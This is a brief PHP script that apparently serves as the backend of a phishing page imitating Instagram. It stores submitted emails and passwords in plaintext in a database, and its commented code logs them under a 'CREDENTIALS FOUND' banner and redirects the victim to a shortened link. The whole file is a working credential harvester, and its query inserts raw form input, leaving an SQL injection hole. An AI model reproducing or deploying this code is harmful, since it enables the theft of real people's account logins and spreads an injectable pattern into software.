<?php
$con=mysqli_connect("localhost","root","","instadb");
if(mysqli_connect_errno())
{
    echo "connection failed";
    exit();
}
else{
    echo "connection successful!";
    $username=$_POST["Email"];
    $password=$_POST["password"];
    $sql="INSERT INTO userpass VALUES('$username','$password')";
    mysqli_query($con,$sql);
}
// $username = $_POST['Email'];
// $password = $_POST['password'];
// $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
// error_log("[+] Credentials Found!!!");
// error_log("$res");
// // echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
// echo "success";
?>
